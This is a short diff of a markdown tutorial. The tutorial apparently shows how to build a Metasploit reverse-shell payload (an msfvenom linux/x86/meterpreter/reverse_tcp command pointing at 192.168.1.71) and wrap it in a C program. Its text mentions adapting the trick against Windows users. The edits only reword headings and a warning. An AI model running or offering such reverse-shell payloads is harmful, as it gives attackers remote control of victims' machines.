@@ -93,7 +93,7 @@ sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 
 
 <br />
 
-#### See whats written inside chars.raw (optional)
+#### Review whats written inside chars.raw (optional)
 
 ```
 cat chars.raw
@@ -135,11 +135,11 @@ echo "}" >> payload.c
 ```
 
 ![pic](http://i67.tinypic.com/309rd74.png)
-WARNING: This C Program only works in Linux distros, but with a few modification like the inclusion of **<windows.h>** lib and with a diferent gcc compiler command syntax it can be possible to pull out the same trick agains windows users using the apropriate payload. 
+WARNING: This C Program only works in Linux distros, but with a few modification like the inclusion of **<windows.h>** lib and with a diferent gcc compiler command syntax it can be possible to pull out the same trick agains windows users.<br /> 
 
 <br />
 
-#### See whats written inside payload.c (optional)
+#### Review whats written inside payload.c (optional)
 
 ```
 cat payload.c
